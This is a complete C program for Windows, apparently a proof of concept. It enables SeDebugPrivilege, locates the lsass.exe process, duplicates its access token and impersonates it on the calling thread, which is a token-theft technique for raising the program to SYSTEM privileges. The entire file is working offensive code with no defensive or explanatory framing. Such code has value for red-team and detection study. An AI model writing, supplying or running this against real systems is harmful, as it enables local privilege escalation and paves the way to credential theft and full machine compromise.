#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>
#include <tlhelp32.h>

/**
 * @brief Enables SeDebugPrivilege for the current process
 *
 * @return TRUE on success, FALSE on failure
 */
BOOL enable_debug_privilege(void);

/**
 * @brief Searches for lsass.exe process ID
 * 
 * @return Process ID of lsass.exe if found, otherwise 0
 */
DWORD find_lsass_procid(void);

/**
 * @brief Duplicates access token of a process
 * 
 * @param pid Target process ID
 * @return Handle to duplicated impersonation token on success, or NULL on failure
 */
HANDLE duplicate_proc_token(DWORD pid);

/**
 * @brief Impersonates access token on the calling thread
 * 
 * @param hToken Access token handle to impersonate
 * @return TRUE on success, FALSE on failure
 */
BOOL impersonate_token(HANDLE hToken);

int main(void)
{
    if (!enable_debug_privilege()) {
        fprintf(stderr, "Failed to enable SeDebugPrivilege\n");
        return EXIT_FAILURE;
    }

    printf("Enabled SeDebugPrivilege!\n");

    DWORD lsass_pid = find_lsass_procid();
    if (lsass_pid == 0) {
        fprintf(stderr, "Could not retrieve lsass.exe proc ID\n");
        return EXIT_FAILURE;
    }

    printf("Lsass proc ID: %lu\n", lsass_pid);

    HANDLE hToken = duplicate_proc_token(lsass_pid);
    if (!hToken) {
        fprintf(stderr, "Could not duplicate proc token\n");
        return EXIT_FAILURE;
    }

    if (impersonate_token(hToken)) {
        printf("Token impersonation success!\n");
        RevertToSelf();
    }
    
    CloseHandle(hToken);
    return EXIT_SUCCESS;
}

BOOL impersonate_token(HANDLE hToken)
{
    if (!SetThreadToken(NULL, hToken)) {
        fprintf(stderr, "SetThreadToken failed\n");
        return FALSE;
    }

    return TRUE;
}

HANDLE duplicate_proc_token(DWORD pid)
{
    HANDLE hProc;
    HANDLE hToken;

    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        fprintf(stderr, "OpenProcess failed (%lu)\n", GetLastError());
        return NULL;
    }

    printf("OpenProcess success (%lu)\n", pid);

    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
        fprintf(stderr, "OpenProcessToken failed (%lu)\n", GetLastError());
        CloseHandle(hProc);
        return NULL;
    }

    printf("OpenProcessToken success (%lu)\n", pid);

    HANDLE hNewToken;
    if (!DuplicateTokenEx(
            hToken, 
            TOKEN_QUERY | TOKEN_IMPERSONATE, 
            NULL, 
            SecurityImpersonation, 
            TokenImpersonation,
            &hNewToken)) 
    {
        fprintf(stderr, "DuplicateTokenEx failed (%lu)\n", GetLastError());
        CloseHandle(hProc);
        return NULL;
    }

    printf("DuplicateTokenEx success (%lu)\n", pid);
    CloseHandle(hProc);
    CloseHandle(hToken);
    return hNewToken;
}

DWORD find_lsass_procid(void)
{
    HANDLE hProcSnap;
    PROCESSENTRY32W pe32;
    DWORD lsass_procid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed (%lu)\n", GetLastError());
        return lsass_procid;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (!Process32FirstW(hProcSnap, &pe32)) {
        fprintf(stderr, "Process32FirstW failed (%lu)\n", GetLastError());
        CloseHandle(hProcSnap);
        return lsass_procid;
    }

    do {
        if (wcscmp(pe32.szExeFile, L"lsass.exe") == 0) {
            lsass_procid = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(hProcSnap, &pe32));

    CloseHandle(hProcSnap);
    return lsass_procid;
}

BOOL enable_debug_privilege(void)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &hToken))
    {
        fprintf(stderr, "OpenProcessToken failed (%lu)\n", GetLastError());
        return FALSE;
    }
    
    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        fprintf(stderr, "LookupPrivilegeValueW failed (%lu)\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(
            hToken,
            FALSE,
            &tp,
            sizeof tp,
            NULL,
            NULL))
    {
        fprintf(stderr, "AdjustTokenPrivileges failed (%lu)\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        fprintf(stderr, "SeDebugPrivilege not assigned\n");
        return FALSE;
    }

    return TRUE;
}
